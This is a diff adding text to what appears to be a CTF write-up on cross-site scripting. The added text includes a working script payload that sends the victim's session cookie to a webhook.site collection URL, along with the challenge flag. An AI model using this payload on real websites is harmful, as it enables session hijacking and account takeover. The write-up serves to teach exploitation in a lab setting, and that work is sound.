@@ -60,8 +60,18 @@ Using the example from earlier, the `<script>` and `</script>` tags are used to 
 Remember when I mentioned that we could try to gain access to the admin account? That's exactly what we need to do with XSS.
 Because your session data is stored in your cookies, we need to exfiltrate the session cookie.
 
-For this, we can either use ![webhook.site](https://webhook.site) or ![PostBin](https://www.toptal.com/developers/postbin/)
+For this, we can either use ![webhook.site](https://webhook.site) or ![PostBin](https://www.toptal.com/developers/postbin/), both work perfectly fine but I prefer to use webhook.site
+
+With the information I had, I created this payload:
+```
+<script>javascript:document.location='https://webhook.site/55b56003-41e1-481d-8865-4e5463f746d4?cookie='+document.cookie;</script>
+```
+Don't worry if you don't know what this means, I'll break it down.
+
+#### How does this work?
 
 ```
 STF22{s1mpl3_p0st_xSs_:)}
 ```
+
+
